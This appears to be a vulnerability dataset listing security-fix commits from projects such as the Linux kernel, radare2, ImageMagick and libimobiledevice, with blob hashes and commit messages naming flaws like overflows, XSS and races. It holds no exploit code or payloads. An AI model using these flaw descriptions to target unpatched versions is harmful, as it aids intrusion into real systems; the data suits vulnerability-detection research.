    18c020124ff1b2441f714da2017f63dba50720ba
File(s) In Commit: 
    common/rfb/PixelBuffer.cxx
Blob(s) In Commit: 
    7f3df6cba883f6acbf8f26c541eaefd63f917a50
Blob(s) Before Fix: 
    89addabcca459989f57551ac51f143d2e1a2d5cd
Projects:
    0019_tigervnc
Commit Message for 18c020124ff1b2441f714da2017f63dba50720ba:
Fix buffer overflow in ModifiablePixelBuffer::fillRect.\n\nIt can be triggered by RRE message with subrectangle out of framebuffer boundaries. It may prevent the same kind of issue caused by evil message from another encoding too.

======================================================================
Commit With Fix: 
    30d598ce7cd3f136ee9d7097f39fa9818a272441
File(s) In Commit: 
    protocols/purple/ft.c
Blob(s) In Commit: 
    79476ebc97aaa66b027a5a6f142d8b73a2ce31b1
Blob(s) Before Fix: 
    320fc887071450f956622573de8969e40738e35e
    81fee8d040d87891ce2ac01685840e2b677fc0a4
    d1484054b4f832aa53e0dcd424230286fccfff3e
Projects:
    AaronVanGeffen_bitlbee
Commit Message for 30d598ce7cd3f136ee9d7097f39fa9818a272441:
purple: Fix crash on ft requests from unknown contacts\n\nFollowup to 701ab81 (included in 3.5) which was a partial fix which only improved things for non-libpurple file transfers (that is, just jabber)

======================================================================
Commit With Fix: 
    d21017b52a585f145e8d62781bcc1c5fefc7ee37
File(s) In Commit: 
    gst/asfdemux/gstasfdemux.c
Blob(s) In Commit: 
    b8d48ad6863c802e94fea2a8cd53797210d935ed
Blob(s) Before Fix: 
    255a427f4d3f91cb8c093e37608945c8abe410ec
    ea5158f822548810ff3086add61ee507aa6cd629
Projects:
    0x4b1d3n_WebKitForWayland
Commit Message for d21017b52a585f145e8d62781bcc1c5fefc7ee37:
asfdemux: Check that we have enough data available before parsing bool/uint extended content descriptors\n\nhttps://bugzilla.gnome.org/show_bug.cgi?id=777955

======================================================================
Commit With Fix: 
    7f02eca670f29c00a1d2c305e96febae6ce5d37b
File(s) In Commit: 
    libyara/grammar.y
Blob(s) In Commit: 
    bf3c88b4d2119eae8d4b349689f85713e8649b32
Blob(s) Before Fix: 
    446d37410e0aa33e663f2547406d353290f213a4
Projects:
    06052017_yara
Commit Message for 7f02eca670f29c00a1d2c305e96febae6ce5d37b:
Make sure that loop depth is greater than 0 before decrementing it.

======================================================================
Commit With Fix: 
    9dcfc7daa4c940992920d3b2fbd317da20e44aad
File(s) In Commit: 
    lib/viewvc.py
Blob(s) In Commit: 
    922baa2e15940115a78ce6d82ac03f8768ce3ee2
Blob(s) Before Fix: 
    84bdca90720aaa15a19e6e5bfc1a55ed1dba4cf0
Projects:
    00zhengfu00_EventBus
Commit Message for 9dcfc7daa4c940992920d3b2fbd317da20e44aad:
Escape some raw path data before handing off to templates\n\n* lib/viewvc.py   (nav_path): Escape the 'name' property of navigation path components     the same way we escape that of the 'root' path component.\n\nReported by: Thomas Gerbet <thomas.gerbet@enalean.com>

======================================================================
Commit With Fix: 
    34b2cef20f19c87999fff3da4071e66937db9644
File(s) In Commit: 
    net/ipv4/ip_sockglue.c
Blob(s) In Commit: 
    900011709e3b8e4807daaa6bf537c3871a7d9306
Blob(s) Before Fix: 
    035ad645a8d9d8abd55321ad2bcd0e44d1d0fc3c
    53ae0c6315ad03e46f93ae68cb930fff5848edcd
    57e1405e82822543ed6fc788e8b7dc69091f2bb3
    5cd99271d3a6a07c17a915fddde7a5a0c8a86618
    65336f38a5d8f499a5a2f1adc5a5732908a133f6
    71a52f4d4cffba2db9353f43dc817689bf4fab10
    a50124260f5a4aaa98a3e4a582dbcbdbc236e370
    af4919792b6a812041dcb18ff30aa8b27482c7a2
    b8a2d63d1fb82f5084a0d98911b8110816dee963
    c3c359ad66e3ddb8295b160de30130b405238072
    f226f4086e05f0493b28024753676a72018e02a9
Projects:
    0-T-0_ps4-linux
Commit Message for 34b2cef20f19c87999fff3da4071e66937db9644:
ipv4: keep skb->dst around in presence of IP options\n\nAndrey Konovalov got crashes in __ip_options_echo() when a NULL skb->dst is accessed.\n\nipv4_pktinfo_prepare() should not drop the dst if (evil) IP options are present.\n\nWe could refine the test to the presence of ts_needtime or srr, but IP options are not often used, so let's be conservative.\n\nThanks to syzkaller team for finding this bug.\n\nFixes: d826eb14ecef ("ipv4: PKTINFO doesnt need dst reference") Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    16af238036a5464ae8f2420ed3af214f0de875f9
File(s) In Commit: 
    src/lxc/lxc_user_nic.c
Blob(s) In Commit: 
    96dc3986fd87c7c9ae9457e013dcae4cc94a6043
Blob(s) Before Fix: 
    409a53a16cde0154bcdc4f718d62532e539c8ed3
Projects:
    0x0916_lxc
Commit Message for 16af238036a5464ae8f2420ed3af214f0de875f9:
CVE-2017-5985: Ensure target netns is caller-owned\n\nBefore this commit, lxc-user-nic could potentially have been tricked into operating on a network namespace over which the caller did not hold privilege.\n\nThis commit ensures that the caller is privileged over the network namespace by temporarily dropping privilege.\n\nLaunchpad: https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1654676 Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Christian Brauner <christian.brauner@ubuntu.com>

======================================================================
Commit With Fix: 
    2dcab598484185dea7ec22219c76dcdd59e3cb90
File(s) In Commit: 
    net/sctp/socket.c
Blob(s) In Commit: 
    e214d2e7e9a30c02847daf354668c42eeaffd0d6
Blob(s) Before Fix: 
    37eeab7899fc235a56bd2f4ccdb3e6c338a8d48e
Projects:
    0-T-0_ps4-linux
Commit Message for 2dcab598484185dea7ec22219c76dcdd59e3cb90:
sctp: avoid BUG_ON on sctp_wait_for_sndbuf\n\nAlexander Popov reported that an application may trigger a BUG_ON in sctp_wait_for_sndbuf if the socket tx buffer is full, a thread is waiting on it to queue more data and meanwhile another thread peels off the association being used by the first thread.\n\nThis patch replaces the BUG_ON call with a proper error handling. It will return -EPIPE to the original sendmsg call, similarly to what would have been done if the association wasn't found in the first place.\n\nAcked-by: Alexander Popov <alex.popov@linux.com> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Reviewed-by: Xin Long <lucien.xin@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    321027c1fe77f892f4ea07846aeae08cefbbb290
File(s) In Commit: 
    kernel/events/core.c
Blob(s) In Commit: 
    cbc5937265da842bc714cbccf8091484caa5f536
Blob(s) Before Fix: 
    72ce7d63e561c050e14dfb423a5626efa50bc4cb
Projects:
    0-T-0_ps4-linux
Commit Message for 321027c1fe77f892f4ea07846aeae08cefbbb290:
perf/core: Fix concurrent sys_perf_event_open() vs. 'move_group' race\n\nDi Shen reported a race between two concurrent sys_perf_event_open() calls where both try and move the same pre-existing software group into a hardware context.\n\nThe problem is exactly that described in commit:\n\n  f63a8daa5812 ("perf: Fix event->ctx locking")\n\n... where, while we wait for a ctx->mutex acquisition, the event->ctx relation can have changed under us.\n\nThat very same commit failed to recognise sys_perf_event_context() as an external access vector to the events and thereby didn't apply the established locking rules correctly.\n\nSo while one sys_perf_event_open() call is stuck waiting on mutex_lock_double(), the other (which owns said locks) moves the group about. So by the time the former sys_perf_event_open() acquires the locks, the context we've acquired is stale (and possibly dead).\n\nApply the established locking rules as per perf_event_ctx_lock_nested() to the mutex_lock_double() for the 'move_group' case. This obviously means we need to validate state after we acquire the locks.\n\nReported-by: Di Shen (Keen Lab) Tested-by: John Dias <joaodias@google.com> Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: Alexander Shishkin <alexander.shishkin@linux.intel.com> Cc: Arnaldo Carvalho de Melo <acme@kernel.org> Cc: Arnaldo Carvalho de Melo <acme@redhat.com> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Kees Cook <keescook@chromium.org> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Min Chong <mchong@google.com> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Stephane Eranian <eranian@google.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: Vince Weaver <vincent.weaver@maine.edu> Fixes: f63a8daa5812 ("perf: Fix event->ctx locking") Link: http://lkml.kernel.org/r/20170106131444.GZ3174@twins.programming.kicks-ass.net Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4
File(s) In Commit: 
    net/dccp/input.c
Blob(s) In Commit: 
    8fedc2d497709b3dea9202894f45bf5cab043361
Blob(s) Before Fix: 
    3bd14e8853969d8e69f1b67b6eaecd4cf16864e1
    ba347184bda9b3fee1f86db847352ab133ddaa3f
    dbe2573f6ba1f18d44e3f837c3b928888357e08f
Projects:
    0-T-0_ps4-linux
Commit Message for 5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4:
dccp: fix freeing skb too early for IPV6_RECVPKTINFO\n\nIn the current DCCP implementation an skb for a DCCP_PKT_REQUEST packet is forcibly freed via __kfree_skb in dccp_rcv_state_process if dccp_v6_conn_request successfully returns.\n\nHowever, if IPV6_RECVPKTINFO is set on a socket, the address of the skb is saved to ireq->pktopts and the ref count for skb is incremented in dccp_v6_conn_request, so skb is still in use. Nevertheless, it gets freed in dccp_rcv_state_process.\n\nFix by calling consume_skb instead of doing goto discard and therefore calling __kfree_skb.\n\nSimilar fixes for TCP:\n\nfb7e2399ec17f1004c0e0ccfd17439f8759ede01 [TCP]: skb is unexpectedly freed. 0aea76d35c9651d55bbaf746e7914e5f9ae5a25d tcp: SYN packets are now simply consumed\n\nSigned-off-by: Andrey Konovalov <andreyknvl@google.com> Acked-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    72794dc3523bbd5bb370de3c5857cb736c387e18
File(s) In Commit: 
    libr/bin/p/bin_bflt.c
Blob(s) In Commit: 
    833bbba8652a1c780b4681d8c55fc04ee05f657e
Blob(s) Before Fix: 
    b539b2b41336d89fdec4184120224570f35dcf0b
Projects:
    0-T-0_radare2
Commit Message for 72794dc3523bbd5bb370de3c5857cb736c387e18:
Fix #6829 oob write because of using wrong struct

======================================================================
Commit With Fix: 
    ccf7abb93af09ad0868ae9033d1ca8108bdaec82
File(s) In Commit: 
    net/ipv4/tcp.c
Blob(s) In Commit: 
    0efb4c7f6704f662b6c762e48698a41564add2a4
Blob(s) Before Fix: 
    032a96d78c99deda3b3298a305298f92776e2500
    08b8b960a8edc9e1791c395192746acfc8cb1caa
    3251fe71f39f2395befb0e662ca19423e6b9ea90
    4804645bdf0200eadf82ba27914edc09bbe24ac5
    4a044964da6670829e5c47fef52d2cd76360b59f
    6a90a0e130dca903950f74650744b8a84c7e8a4d
    814af89c1bd3418130e0ad90def6623ca13a6d16
    995a2259bcfc80894caec08fe2e7ccd62311e227
    b8b8fa184f7576d238b7c7c0b71b7f9c4acca4ee
    f605357bcaf745263e574febb66a402dca79899e
    ffbb218de52057afbc55f95386200226a1c60517
Projects:
    0-T-0_ps4-linux
Commit Message for ccf7abb93af09ad0868ae9033d1ca8108bdaec82:
tcp: avoid infinite loop in tcp_splice_read()\n\nSplicing from TCP socket is vulnerable when a packet with URG flag is received and stored into receive queue.\n\n__tcp_splice_read() returns 0, and sk_wait_data() immediately returns since there is the problematic skb in queue.\n\nThis is a nice way to burn cpu (aka infinite loop) and trigger soft lockups.\n\nAgain, this gem was found by syzkaller tool.\n\nFixes: 9c55e01c0cc8 ("[TCP]: Splice receive support.") Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Dmitry Vyukov  <dvyukov@google.com> Cc: Willy Tarreau <w@1wt.eu> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ad55822430a03fe075221b543efb434567e9e431
File(s) In Commit: 
    libr/bin/p/bin_dex.c
Blob(s) In Commit: 
    9a91dae9c69e4222c696b2f80784bc8229c870c7
Blob(s) Before Fix: 
    601b28a5d71f3006e06715d7764ac01fc72b4042
Projects:
    0-T-0_radare2
Commit Message for ad55822430a03fe075221b543efb434567e9e431:
Fix #6836 - oob write in dex

======================================================================
Commit With Fix: 
    d199fab63c11998a602205f7ee7ff7c05c97164b
File(s) In Commit: 
    net/packet/af_packet.c
Blob(s) In Commit: 
    0f03f6a53b4ddb8093a2122914200c0738af8fb3
Blob(s) Before Fix: 
    11db0d619c007270e7ac003e916a4a4097a79dc9
    33a4697d55394c0a73b5f88e3b19ecd0d923a878
    3d555c79a7b571161f88bb8df426ea5e6bf1f9dd
    992396aa635ce1174f6e62f19ae3f19a550668c6
    b9e1a13b4ba36a0bc7edf6a8c2c116c7d48c970c
    d2238b204691b8e4f2e3acb9bc167b553ba32d50
    d56ee46b11fc9524e457e5fe8adf10c105a66ab6
    dd2332390c45bbff7c3fc5d259453f2e1ca352bf
    f8db7064d81c770cda356633153230eb905ccb39
Projects:
    0-T-0_ps4-linux
Commit Message for d199fab63c11998a602205f7ee7ff7c05c97164b:
packet: fix races in fanout_add()\n\nMultiple threads can call fanout_add() at the same time.\n\nWe need to grab fanout_mutex earlier to avoid races that could lead to one thread freeing po->rollover that was set by another thread.\n\nDo the same in fanout_release(), for peace of mind, and to help us finding lockdep issues earlier.\n\nFixes: dc99f600698d ("packet: Add fanout support.") Fixes: 0648ab70afe6 ("packet: rollover prepare: per-socket state") Signed-off-by: Eric Dumazet <edumazet@google.com> Cc: Willem de Bruijn <willemb@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ca4ef4574f1ee5252e2cd365f8f5d5bafd048f32
File(s) In Commit: 
    net/ipv4/ip_sockglue.c
Blob(s) In Commit: 
    ebd953bc5607f3b25fffddcb26a5c65e5490cb2b
Blob(s) Before Fix: 
    035ad645a8d9d8abd55321ad2bcd0e44d1d0fc3c
    23e6ab0a2dc0ea070b6a86548b7761f7dbda00d4
    53ae0c6315ad03e46f93ae68cb930fff5848edcd
    57e1405e82822543ed6fc788e8b7dc69091f2bb3
    5cd99271d3a6a07c17a915fddde7a5a0c8a86618
    5f73a7c03e27d334c771f144825c4a2f718d71ba
    64741b9386329ba6a76b00ea660d78983d2efb8a
    71a52f4d4cffba2db9353f43dc817689bf4fab10
    7cfb0893f2636bcc87537da3014643362f72b10f
    8b13881ed0644c3c32e87718752f8613023c72eb
    900011709e3b8e4807daaa6bf537c3871a7d9306
    a50124260f5a4aaa98a3e4a582dbcbdbc236e370
    af4919792b6a812041dcb18ff30aa8b27482c7a2
    b7826575d2154dc67934d47adf90c7cd0fc40635
    b8a2d63d1fb82f5084a0d98911b8110816dee963
    ce1386a67e2434203fdffe126958483ffc69fabd
    fc4bf4d54158494141588c890782c4f087953f62
Projects:
    0-T-0_ps4-linux
Commit Message for ca4ef4574f1ee5252e2cd365f8f5d5bafd048f32:
ip: fix IP_CHECKSUM handling\n\nThe skbs processed by ip_cmsg_recv() are not guaranteed to be linear e.g. when sending UDP packets over loopback with MSGMORE. Using csum_partial() on [potentially] the whole skb len is dangerous  instead be on the safe side and use skb_checksum().\n\nThanks to syzkaller team to detect the issue and provide the reproducer.\n\nv1 -> v2:  - move the variable declaration in a tighter scope\n\nFixes: ad6f939ab193 ("ip: Add offset parameter to ip_cmsg_recv") Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: Paolo Abeni <pabeni@redhat.com> Acked-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4c03b862b12f980456f9de92db6d508a4999b788
File(s) In Commit: 
    net/irda/irqueue.c
Blob(s) In Commit: 
    160dc89335e207e593401f43c0637a766bdb9b68
Blob(s) Before Fix: 
    03ca9fea7d0ce398d5253eea4323d128670b7186
    14291cbc4097fd5865f0e8b62a0582c20089548a
    26ccd65cdcabee74471a02f260c27f4399d938d8
    7152624ed5f18035c2fd223bffd0682697cb86e4
    acbe61c7e6831205ca1d725f65263c849ef092e4
    f06947c4fa82e59679314b07df2444906e99762f
Projects:
    0-T-0_ps4-linux
Commit Message for 4c03b862b12f980456f9de92db6d508a4999b788:
irda: Fix lockdep annotations in hashbin_delete().\n\nA nested lock depth was added to the hasbin_delete() code but it doesn't actually work some well and results in tons of lockdep splats.\n\nFix the code instead to properly drop the lock around the operation and just keep peeking the head of the hashbin queue.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    dfcb9f4f99f1e9a49e43398a7bfbf56927544af1
File(s) In Commit: 
    net/sctp/socket.c
Blob(s) In Commit: 
    465a9c8464f9477f827c14cbdab6879ac181a507
Blob(s) Before Fix: 
    1b5d669e30292a57ed57dd920d81be2a57f97b22
    318c6786d6539a301ac7b76d82a49a1af3818d10
    37eeab7899fc235a56bd2f4ccdb3e6c338a8d48e
    878d28eda1a68dc639d7b9f3f663d7518f21bb32
    9fc417a8b47691258ba64546222905f205f5a9aa
    aafe94bf292e73ecb765a31ae3456c3c11fe932f
    b5321486fbed300106844584d1764181342d8e35
    d5f4b4a8369bc64d8501be37d153e99dead88af5
    de8eabf03eed9b904afd78e9af6f2ab0b172cd2b
    f23ad913dc7a070407813b44acb500a5f7c148e9
    fb02c70333078743e832a7a991f7a44770d19bcc
Projects:
    0-T-0_ps4-linux
Commit Message for dfcb9f4f99f1e9a49e43398a7bfbf56927544af1:
sctp: deny peeloff operation on asocs with threads sleeping on it\n\ncommit 2dcab5984841 ("sctp: avoid BUG_ON on sctp_wait_for_sndbuf") attempted to avoid a BUG_ON call when the association being used for a sendmsg() is blocked waiting for more sndbuf and another thread did a peeloff operation on such asoc, moving it to another socket.\n\nAs Ben Hutchings noticed, then in such case it would return without locking back the socket and would cause two unlocks in a row.\n\nFurther analysis also revealed that it could allow a double free if the application managed to peeloff the asoc that is created during the sendmsg call, because then sctp_sendmsg() would try to free the asoc that was created only for that call.\n\nThis patch takes another approach. It will deny the peeloff operation if there is a thread sleeping on the asoc, so this situation doesn't exist anymore. This avoids the issues described above and also honors the syscalls that are already being handled (it can be multiple sendmsg calls).\n\nJoint work with Xin Long.\n\nFixes: 2dcab5984841 ("sctp: avoid BUG_ON on sctp_wait_for_sndbuf") Cc: Alexander Popov <alex.popov@linux.com> Cc: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Signed-off-by: Xin Long <lucien.xin@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c334dd8499a681587dd4199e90b0aa0eba814c1d
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    524fa313ce593554f4176e874585dbec0f914254
Blob(s) Before Fix: 
    90ae205b1048a31774283e0316b198f61add8f5b
Projects:
    ymuyi_trace.moe
Commit Message for c334dd8499a681587dd4199e90b0aa0eba814c1d:
Fix #8 XSS issue

======================================================================
Commit With Fix: 
    68338b71a563b24e62617bb629059adc0c94b230
File(s) In Commit: 
    libr/bin/p/bin_dex.c
Blob(s) In Commit: 
    13a7b45430aeca38ea8ebbc76e34f406ac0efe14
Blob(s) Before Fix: 
    7293c389a2e0886b1f6c8a8579d76787f595e6d3
    74b6df706b54a357a5d67209a9d4229e18eda753
Projects:
    0-T-0_radare2
Commit Message for 68338b71a563b24e62617bb629059adc0c94b230:
fix #6872

======================================================================
Commit With Fix: 
    fbd8494d5e4e46bf2e90cb6116903e404374fb56
File(s) In Commit: 
    src/bplist.c
Blob(s) In Commit: 
    20e5090e6755052a72fd939ca9ea53aa5ca8ba29
Blob(s) Before Fix: 
    81bd716697f69c09bb21b187f9d3df7815dfd19b
Projects:
    0neday_libimobiledevice
Commit Message for fbd8494d5e4e46bf2e90cb6116903e404374fb56:
bplist: Make sure to bail out if malloc() fails in parse_string_node()\n\nCredit to Wang Junjie <zhunkibatu@gmail.com> (#93)

======================================================================
Commit With Fix: 
    32ee5213fe64f1e10ec76c1ee861ee6f233120dd
File(s) In Commit: 
    src/bplist.c
Blob(s) In Commit: 
    7d21b273b865d734155a4e96e88e67a2145d4760
Blob(s) Before Fix: 
    0fd149e9de1b9d38856f969eba628606532f42cf
    40b453bfc06b7705346c2766db32031ce2405cc6
Projects:
    0neday_libimobiledevice
Commit Message for 32ee5213fe64f1e10ec76c1ee861ee6f233120dd:
bplist: Fix data range check for string/data/dict/array nodes\n\nPassing a size of 0xFFFFFFFFFFFFFFFF to parse_string_node() might result in a memcpy with a size of -1, leading to undefined behavior. This commit makes sure that the actual node data (which depends on the size) is in the range start_of_object..start_of_object+size.\n\nCredit to OSS-Fuzz

======================================================================
Commit With Fix: 
    32ee5213fe64f1e10ec76c1ee861ee6f233120dd
File(s) In Commit: 
    src/bplist.c
Blob(s) In Commit: 
    7d21b273b865d734155a4e96e88e67a2145d4760
Blob(s) Before Fix: 
    0fd149e9de1b9d38856f969eba628606532f42cf
    40b453bfc06b7705346c2766db32031ce2405cc6
Projects:
    0neday_libimobiledevice
Commit Message for 32ee5213fe64f1e10ec76c1ee861ee6f233120dd:
bplist: Fix data range check for string/data/dict/array nodes\n\nPassing a size of 0xFFFFFFFFFFFFFFFF to parse_string_node() might result in a memcpy with a size of -1, leading to undefined behavior. This commit makes sure that the actual node data (which depends on the size) is in the range start_of_object..start_of_object+size.\n\nCredit to OSS-Fuzz

======================================================================
Commit With Fix: 
    f41e941341e44aa86edd4483c4487ec09a074257
File(s) In Commit: 
    libr/asm/p/asm_dalvik.c
Blob(s) In Commit: 
    15654b30e584a65cf3f67068dce072e61324c7c1
Blob(s) Before Fix: 
    6def77ddaf359d1622367bdba1b9aba8dbfd79dc
Projects:
    0-T-0_radare2
Commit Message for f41e941341e44aa86edd4483c4487ec09a074257:
Fix #6885 - oob write in dalvik_disassemble

======================================================================
Commit With Fix: 
    7f2dc7a1afc067d0c89f12c82bcdec0445fb1b94
File(s) In Commit: 
    coders/psd.c
Blob(s) In Commit: 
    fb93c57dd144d115c985877eff2ef8c62ce29d37
Blob(s) Before Fix: 
    14e375b9ed4df4b6ccbfc773e3175af00813485c
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 7f2dc7a1afc067d0c89f12c82bcdec0445fb1b94:
Added missing null check.

======================================================================
Commit With Fix: 
    65f75a32a93ae4044c528a987a68366ecd4b46b9
File(s) In Commit: 
    coders/tga.c
Blob(s) In Commit: 
    7b87278ef55753d09e7d521b28de236408418314
Blob(s) Before Fix: 
    d8adc52f7b8ea1975dc42994b36e8849b670dbc7
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 65f75a32a93ae4044c528a987a68366ecd4b46b9:
https://github.com/ImageMagick/ImageMagick/pull/359

======================================================================
Commit With Fix: 
    3007531bfd326c5c1e29cd41d2cd80c166de8528
File(s) In Commit: 
    coders/sun.c
Blob(s) In Commit: 
    c11a33c62bee5f2213ab65ddc773acdef3369725
Blob(s) Before Fix: 
    150f3357fd77ca1bdb693f964a305c7ca435b3f1
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 3007531bfd326c5c1e29cd41d2cd80c166de8528:
https://github.com/ImageMagick/ImageMagick/issues/375 https://github.com/ImageMagick/ImageMagick/issues/376

======================================================================
Commit With Fix: 
    d31fec57e9dfb0516deead2053a856e3c71e9751
File(s) In Commit: 
    coders/xcf.c
Blob(s) In Commit: 
    2feef82ff19396e57ec010ec1aae8120575f5c5b
Blob(s) Before Fix: 
    083f217ca049e3ffb528a5abad19a19f77e39e3a
Projects:
    2016repotsheyue_ImageMagick
Commit Message for d31fec57e9dfb0516deead2053a856e3c71e9751:
Check for image list before we destroy the last image in XCF coder (patch sent privately by Андрей Черный)

======================================================================
Commit With Fix: 
    1677251434b6e8b2be8f1d4376a3e78f7be14d95
File(s) In Commit: 
    view_filters_page.php
Blob(s) In Commit: 
    5d807683d3b467dfd2f58f48fde7596369ad1709
Blob(s) Before Fix: 
    bccf4b09e6e87e116887bb2732ba331bb6f7414c
    f7f72ce541b0d28c396624680cdf2c4031f3eb38
Projects:
    01-Scripts_mantisbt
Commit Message for 1677251434b6e8b2be8f1d4376a3e78f7be14d95:
Fix XSS in view_filters_page.php\n\nThe value of the view_type parameter was not sanitized before being displayed as a hidden input.\n\nThis vulnerability was reported by Etienne Landais.\n\nFixes #22497

======================================================================
Commit With Fix: 
    f98f5d4adc1c4bd4033638f6167c1bb95d642f89
File(s) In Commit: 
    lib/ytnef.c
Blob(s) In Commit: 
    afb2efbfe73b780a5c60b6fd2c1940614c58502f
Blob(s) Before Fix: 
    c11c77ce9128d0a785acd28725a4d03fd07625de
Projects:
    strk_ytnef
Commit Message for f98f5d4adc1c4bd4033638f6167c1bb95d642f89:
BugFix - data length\n\nEven tho this is a "LONG" type, it's actually only 4 bytes. Typecasting it to a long* caused a dereference beyond the end of the allocated region.\n\nissues#28

======================================================================
Commit With Fix: 
    194f592e205990ea8fce72b6c571c14350aca716
File(s) In Commit: 
    dcraw_foveon.c
Blob(s) In Commit: 
    bdde89d60178831b3efcb53f14e2b95763c6db43
Blob(s) Before Fix: 
    d8b70057e68049410c8065faf12b4c051b1c31fb
Projects:
    LibRaw_LibRaw-demosaic-pack-GPL2
Commit Message for 194f592e205990ea8fce72b6c571c14350aca716:
Fixed possible foveon buffer overrun (Secunia SA750000)

======================================================================
Commit With Fix: 
    194f592e205990ea8fce72b6c571c14350aca716
File(s) In Commit: 
    dcraw_foveon.c
Blob(s) In Commit: 
    bdde89d60178831b3efcb53f14e2b95763c6db43
Blob(s) Before Fix: 
    d8b70057e68049410c8065faf12b4c051b1c31fb
Projects:
    LibRaw_LibRaw-demosaic-pack-GPL2
Commit Message for 194f592e205990ea8fce72b6c571c14350aca716:
Fixed possible foveon buffer overrun (Secunia SA750000)

======================================================================
Commit With Fix: 
    f833c53cb596e9e1792949f762e0b33661822748
File(s) In Commit: 
    src/aiff.c
Blob(s) In Commit: 
    45864b76da8865bf7c3452dc0887225ff0beee52
Blob(s) Before Fix: 
    1171c91edcf88a7b2722fb313afa8c1df5e9feca
    36a088ca305580166aa1d95e76ba6dacb01978d0
    5b5f9f5330c8b74a6f0088607211ea0633568343
    852ff020667934f65f670e4cb280bcdbe26bd57d
    a4c9b661db2e2b3e07bd11eab76713e1eb65461f
    f64e3630d9a5bcc6f4cd11bcde39c382f46f579b
Projects:
    12gjang_libsndfile
Commit Message for f833c53cb596e9e1792949f762e0b33661822748:
src/aiff.c: Fix a buffer read overflow\n\nSecunia Advisory SA76717.\n\nFound by: Laurent Delosieres, Secunia Research at Flexera Software

======================================================================
Commit With Fix: 
    62046f511fc02ad783ad170404c80db3c69f0408
File(s) In Commit: 
    web/concrete/tools/files/selector_data.php
Blob(s) In Commit: 
    9bbaa7ee54578a5ca2dc1c4c8813ea4fb33ba832
Blob(s) Before Fix: 
    f823f45baebecaf6e124b972701b3da8ea1c6a5f
Projects:
    16nsk_concrete5-5.7.0
Commit Message for 62046f511fc02ad783ad170404c80db3c69f0408:
Fix #1948

======================================================================
Commit With Fix: 
    6fe86eef621b9849f51a5e1e5d73258a93440403
File(s) In Commit: 
    windows/winkernel_mm.c
Blob(s) In Commit: 
    ecdc1ca2d68ad1bdc848182dcb3787cfdb0599d9
Blob(s) Before Fix: 
    08ca9945fa6d255a4e9666e5504c682b253c40f0
    1818e1abfcd107ab5ee4a9ca4d902ab275a6bae0
    2a37866466fc29e71f8314819128ec36404eb1ad
    c127da3ac43b4befb953dafa0da5b3623a1525ec
Projects:
    0vercl0k_capstone
Commit Message for 6fe86eef621b9849f51a5e1e5d73258a93440403:
provide a validity check to prevent against Integer overflow conditions (#870)\n\n* provide a validity check to prevent against Integer overflow conditions    * fix some style issues.

======================================================================
Commit With Fix: 
    75293ed4e5f31f04e54689bfe2c647e3e3f5e1a9
File(s) In Commit: 
    includes/component.php
Blob(s) In Commit: 
    ec05a320a0dfebed375c93fd195b9d5ab18a045c
Blob(s) Before Fix: 
    1181f0cfd9070a0c9ff08730e04be47f7a04bd84
    39a5563d108f0c870d2c97893996a6cf11e020d2
    5f354f47fe5f49752f845539201b7f55d0e69b69
    bd95ad41e0b7801cdf19081c4ee1217464182ec7
    f1e97e545996bfd2073fd45785d2b2a0b9e4634e
    f52f0812fe946d4e5ce5d75528c5e1749dad2fed
Projects:
    Apatrid_buddypress-docs
Commit Message for 75293ed4e5f31f04e54689bfe2c647e3e3f5e1a9:
Improved permission check when processing a Doc save request.

======================================================================
Commit With Fix: 
    77b2631c78461965bc9a7414aae206b5c514e1b3
File(s) In Commit: 
    src/fe-common/irc/fe-netjoin.c
Blob(s) In Commit: 
    8272093fea332830d77c2ca0a28cc59932ca1ad6
Blob(s) Before Fix: 
    35ee43f53b0f71eab8533f13ad627f144bbe56ac
    4eb388c05ec0cebe0e5dca2b4eb7bafa19f65215
Projects:
    0577215664_irssi
Commit Message for 77b2631c78461965bc9a7414aae206b5c514e1b3:
Merge branch 'netjoin-timeout' into 'master'\n\nfe-netjoin: remove irc servers on "server disconnected" signal\n\nCloses #7\n\nSee merge request !10

======================================================================
Commit With Fix: 
    1ebb71143758f45dc0fa76e2f48429e13b16d110
File(s) In Commit: 
    drivers/hid/hid-cypress.c
Blob(s) In Commit: 
    1689568b597d4e5bb8824ccbe679f627525bf2a4
Blob(s) Before Fix: 
    1b764d1745f3daa693a17ee706c302ff31ae0f0e
    2f0be4c66af72f356fb2cedf144c1d45375493a7
    57d3c752f054de5a9568f61a712a5c7c34c2e9fd
    9e43aaca9774bec161aa37a6734e57fdcad2a66c
    a50ba4a4a1d71be06763f9ec0d23300b303d10d3
    c4ef3bc726e34e5e08aa947b64ddfa4dc7f772b0
    e299576004ce52c6d9042a2caf223279ecc095a9
Projects:
